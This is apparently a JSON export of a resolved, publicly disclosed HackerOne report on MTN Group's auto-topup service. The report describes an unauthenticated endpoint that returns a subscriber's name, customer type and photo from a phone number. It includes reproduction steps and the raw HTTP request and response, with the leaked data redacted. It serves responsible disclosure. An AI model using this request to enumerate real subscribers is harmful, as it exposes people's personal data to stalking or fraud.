@@ -1,0 +1,117 @@
+{
+  "id": 1541660,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTQxNjYw",
+  "url": "https://hackerone.com/reports/1541660",
+  "title": "Information Disclosure Leads To User Data Leak",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2022-04-14T20:48:44.992Z",
+  "submitted_at": "2022-04-14T20:48:45.048Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "netboy",
+    "url": "/netboy",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTc0NDA4MiwicHVyIjoiYmxvYl9pZCJ9fQ==--5bd861415dd2dbca8caadd882a5d265495b02a3e/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/-s8580i.jpg"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-12-24T13:34:44.220Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-11-24T13:34:30.353Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Information disclosure is when a web application fails to properly protect confidential information, which causes revealing sensitive information or data of the users or anything related to users to any third party.\n\n## Summary:\nAm able to get any MTN users data such as FULL NAME, CUSTOMER TYPE AND PICTURE.\nI can get those data by using only phone number of any MTN users.\nVUL URL: https://mtnautotopup.mtnonline.com/autotopup/app/sign-up-phone \nVUL URL: https://197.210.3.135/autotopup/app/sign-up-phone\n~NOTE: Tested with a Nigeria phone number that belong to me.\n\n## Steps To Reproduce:\n\n  1. Visit `https://mtnautotopup.mtnonline.com/autotopup/app/sign-up-phone` or `https://197.210.3.135/autotopup/app/sign-up-phone`\n  2. Put in a phone number and catch the request via BURP\n  3. INTERCEPT  the request of `GET /vtu-service/api/pwa/pub/get-bio-data/081*******`\n  4. The response contains Fullname, Customer Type and Picture of the user.\n\n## Supporting Material/References:\nVUL REQUEST:\n```\nGET /vtu-service/api/pwa/pub/get-bio-data/070******** HTTP/1.1\nHost: mtnautotopupservices.mtnonline.com\nSec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"\nAccept: application/json, text/plain, */*\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://mtnautotopup.mtnonline.com\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://mtnautotopup.mtnonline.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n```\nRESPONSE:\n```\nHTTP/1.1 200 OK\nDate: Thu, 14 Apr 2022 20:11:05 GMT\nServer: WildFly/10\nX-Frame-Options: https://mtnautotopup.mtnonline.com, https://mtnautotopupservices.mtnonline.com, https://billable.mtnonline.com, https://mtnautotopup.mtnonline.com, https://mtnautotopupservices.mtnonline.com, https://billable.mtnonline.com\nAccess-Control-Allow-Credentials: âtrueâ, âtrueâ\nAccess-Control-Expose-Headers: origin, content-type, accept, Authorization,Access-Control-Allow-Origin, origin, content-type, accept, Authorization,Access-Control-Allow-Origin\nAccess-Control-Allow-Headers: Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization, Access-Control-Allow-Methods, Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization, Access-Control-Allow-Methods\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: origin-when-cross-origin\nAccess-Control-Allow-Origin: *\nX-Powered-By: Undertow/1\nContent-Type: application/json\nCache-Control: max-age=0, public, no-cache, private, no-store\nExpires: Sat, 16 Apr 2022 20:11:05 GMT\nAccess-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS\nX-Content-Type-Options: nosniff\nX-Content-Security-Policy: default-src 'self' *.mtnonline.com\nStrict-Transport-Security: max-age=631138519; includeSubDomains\nFeature-Policy: vibrate *; usermedia *; sync-xhr *\nAccess-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS\nX-Content-Security-Policy: default-src 'self' *.mtnonline.com\nFeature-Policy: vibrate *; usermedia *; sync-xhr *\nConnection: close\nContent-Length: 295017\n\n{\"responseCode\":\"00\",\"responseDescription\":\"Successful\",\"firstname\":\"EXPOSE\",\"lastname\":\"EXPOSE\",\"othername\":\"EXPOSE\",\"customerType\":\"Prepaid\",\"profileImg\":\"EXPOSE\"}\n```\nNOTE: I replaced the exposed data with EXPOSE.\n\n## Impact\n\nAn attacker can retrieve any users data (like full name, Customer Type, and Picture) by just using the victim phone number.\nThis can be use for information gathering about someone for malicious use or criminal activity.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-12-24T13:34:30.474Z",
+  "allow_singular_disclosure_after": -86516573.87589529,
+  "singular_disclosure_allowed": true,
+  "vote_count": 23,
+  "voters": [
+    "nicochess",
+    "0xtarun",
+    "jumpydata",
+    "hackcommander",
+    "zy9ard3",
+    "shreyaschavhan",
+    "shubham_srt",
+    "pacmanx",
+    "khizer47",
+    "sa1tama0",
+    "and 13 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 34320,
+    "asset_type": "URL",
+    "asset_identifier": "mtnonline.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
